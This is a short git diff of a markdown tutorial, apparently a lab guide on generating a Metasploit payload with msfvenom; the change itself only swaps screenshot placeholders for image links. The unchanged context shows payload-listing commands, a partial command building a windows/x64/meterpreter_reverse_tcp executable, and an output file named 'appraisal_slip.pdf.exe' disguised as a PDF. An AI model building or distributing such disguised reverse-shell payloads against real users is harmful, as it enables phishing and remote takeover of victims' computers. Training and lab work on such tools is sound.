@@ -65,7 +65,7 @@ msfvenom               # View all available options and flags
 msfvenom -l payloads   # List all payloads with descriptions
 ```
 
-> 📸 `msfvenom_options.png` · `msfvenom_payloads.png` · `payload_name.png`
+> ![Msfvenom Options](msfvenom_options.png) · ![Msfvenom Payloads](msfvenom_payloads.png) · ![Payload Name](payload_name.png)
 
 **Selected Payload:** `windows/x64/meterpreter_reverse_tcp`
 
@@ -104,7 +104,7 @@ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<your_ip> LPORT=4444 -f ex
 ls
 ```
 
-> 📸 `payload_present.png`
+> ![Payload Created](payload_created.png)
 
 Confirms the payload `appraisal_slip.pdf.exe` was successfully generated in the current working directory.
 
